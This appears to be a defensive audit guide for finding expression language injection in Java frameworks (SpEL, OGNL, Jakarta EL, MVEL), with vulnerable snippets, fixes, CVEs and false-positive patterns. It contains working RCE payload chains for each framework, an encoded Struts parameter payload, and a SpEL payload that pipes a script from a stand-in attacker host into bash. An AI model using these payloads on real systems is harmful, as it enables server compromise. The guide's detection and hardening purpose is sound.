# Expression Language Injection Detection

## Methodology

### Step 1: Identify Expression Language Frameworks and Entry Points

Map all locations where expression language (EL) evaluation occurs.

**Spring SpEL (Java):**
```java
SpelExpressionParser parser = new SpelExpressionParser();
Expression exp = parser.parseExpression(userInput);  // DANGEROUS
exp.getValue();
@PreAuthorize("hasRole('" + userInput + "')")         // DANGEROUS
```

**Jakarta / Javax EL (Java EE):**
```java
ExpressionFactory factory = ExpressionFactory.newInstance();
ValueExpression ve = factory.createValueExpression(
    elContext, "${" + userInput + "}", String.class   // DANGEROUS
);
```

**OGNL (Apache Struts 2):**
```java
Object expr = Ognl.parseExpression(userInput);        // DANGEROUS
Ognl.getValue(expr, context, root);
// Struts 2 auto-binds HTTP params via OGNL: %{userInput}
```

**MVEL:**
```java
MVEL.eval(userInput);                                 // DANGEROUS
MVEL.compileExpression(userInput);                    // DANGEROUS
```

### Step 2: Trace User Input into Expression Strings

```java
// VULNERABLE: SpEL evaluation of request parameter
@GetMapping("/calc")
public String calculate(@RequestParam String expr) {
    return new SpelExpressionParser().parseExpression(expr).getValue(String.class);
}

// VULNERABLE: OGNL via Struts 2 parameter names
// URL: /action?(%23rt%3d%40java.lang.Runtime%40getRuntime())=1
```

### Step 3: Map Known RCE Chains per Framework

**SpEL:** `T(java.lang.Runtime).getRuntime().exec('id')`
**OGNL:** `#rt=@java.lang.Runtime@getRuntime(),#rt.exec('id')`
**Jakarta EL:** `${"".class.forName("java.lang.Runtime").getMethods()[6].invoke(...)}`
**MVEL:** `Runtime.getRuntime().exec("id")`

### Step 4: Check for Expression Language Restrictions

```java
// SAFE: SimpleEvaluationContext blocks type references and constructors
SimpleEvaluationContext context = SimpleEvaluationContext
    .forReadOnlyDataBinding().build();
parser.parseExpression(expr).getValue(context);

// DANGEROUS: StandardEvaluationContext allows everything
StandardEvaluationContext context = new StandardEvaluationContext();
parser.parseExpression(expr).getValue(context);
```

```xml
<!-- OGNL: Struts 2.5+ security settings -->
<constant name="struts.ognl.allowStaticMethodAccess" value="false" />
<constant name="struts.excludedClasses" value="java.lang.Runtime,..." />
```

### Step 5: Detect Indirect Expression Injection

Expressions injected through data stores, configuration, or message templates:

```java
// VULNERABLE: user-editable message template with SpEL
String template = messageRepository.findByKey(userKey);
// If user injects: #{T(java.lang.Runtime).getRuntime().exec('id')}
```

### Step 6: Audit Framework Version for Known CVEs

| Framework | CVE | Description |
|---|---|---|
| Struts 2 | CVE-2017-5638 | Content-Type OGNL injection |
| Struts 2 | CVE-2018-11776 | Namespace OGNL injection |
| Spring | CVE-2022-22963 | Spring Cloud Function SpEL injection |
| Spring | CVE-2022-22980 | Spring Data MongoDB SpEL injection |
| Confluence | CVE-2022-26134 | OGNL injection in URL |

## Decision Tree

```
User input reaches expression evaluation API?
|
+-- NO --> SAFE
|
+-- YES
    |
    +-- SpEL with SimpleEvaluationContext? --> HARDENED (Medium)
    +-- SpEL with StandardEvaluationContext? --> VULNERABLE (Critical)
    +-- OGNL on Struts 2.5+ with excludedClasses? --> HARDENED (Medium)
    +-- OGNL on Struts < 2.5? --> VULNERABLE (Critical)
    +-- Jakarta EL with user-reflected content? --> VULNERABLE (High)
    +-- MVEL without sandbox? --> VULNERABLE (Critical)
```

## Real-World Examples

### Example 1: SpEL Injection in Spring Metrics Endpoint

```java
@GetMapping("/api/metrics/eval")
public ResponseEntity<String> evalMetric(@RequestParam String expression) {
    StandardEvaluationContext ctx = new StandardEvaluationContext();
    ctx.setVariable("metrics", metricsService);
    Object result = parser.parseExpression(expression).getValue(ctx);
    return ResponseEntity.ok(result.toString());
}
```

**Why vulnerable:** `expression` is passed directly to `parseExpression()` with `StandardEvaluationContext`. Attacker sends `T(java.lang.Runtime).getRuntime().exec('curl attacker.com/shell.sh|bash')`.

**Impact:** Remote code execution. Complete server compromise.

**Fix:**
```java
@GetMapping("/api/metrics/eval")
public ResponseEntity<String> evalMetric(@RequestParam String metricName) {
    String expression = ALLOWED_METRICS.get(metricName);
    if (expression == null) return ResponseEntity.badRequest().body("Unknown metric");
    SimpleEvaluationContext ctx = SimpleEvaluationContext
        .forReadOnlyDataBinding().withInstanceMethods().build();
    Object result = parser.parseExpression(expression).getValue(ctx, metricsService);
    return ResponseEntity.ok(result.toString());
}
```

### Example 2: OGNL Injection via Struts 2 Parameter Names

```xml
<package name="default" extends="struts-default">
    <action name="search" class="com.app.SearchAction">
        <result>/search.jsp</result>
    </action>
</package>
```

**Why vulnerable:** Struts 2 < 2.5 processes HTTP parameter names through OGNL. URL-decoded parameter name `#rt=@java.lang.Runtime@getRuntime().exec('id')` executes commands. This class led to the Equifax breach.

**Impact:** Unauthenticated RCE. Complete server takeover.

**Fix:**
```xml
<constant name="struts.ognl.allowStaticMethodAccess" value="false" />
<constant name="struts.excludedClasses"
    value="java.lang.Runtime,java.lang.ProcessBuilder,java.lang.System" />
<constant name="struts.excludedPackageNames"
    value="java.lang.,ognl.,javax.management." />
```

### Example 3: SpEL Injection in Spring Data MongoDB

```java
public interface UserRepository extends MongoRepository<User, String> {
    @Query("{'name': ?#{#name}}")
    List<User> findByDynamicName(@Param("name") String name);
}
```

**Why vulnerable:** Spring Data MongoDB's `@Query` with SpEL was vulnerable to CVE-2022-22980, allowing RCE through parameter injection into the SpEL evaluation context.

**Impact:** Query manipulation, potential RCE depending on Spring Data version.

**Fix:**
```java
public interface UserRepository extends MongoRepository<User, String> {
    @Query("{'name': ?0}")
    List<User> findByName(String name);
}
```

## Common False Positive Patterns

1. **SpEL in @Value with static property keys** -- `@Value("#{systemProperties['app.name']}")` reads properties at startup with no user input.

2. **SpEL in Spring Security with hardcoded roles** -- `@PreAuthorize("hasRole('ADMIN')")` is a static expression, not user-controlled.

3. **OGNL in Struts 2 tags with static values** -- `<s:property value="user.name" />` references a fixed path on the value stack.

4. **EL expressions hardcoded in JSP** -- `${sessionScope.user.name}` reads from server-side session with no injection surface.

5. **SpEL used only in test code** -- Expression evaluation in tests for assertions is not reachable in production.

6. **SimpleEvaluationContext with data binding only** -- Blocks `T()`, constructors, and static methods, making RCE significantly harder.

7. **MVEL in Drools rules loaded from classpath** -- Developer-controlled rule files bundled in the application are not modifiable at runtime.
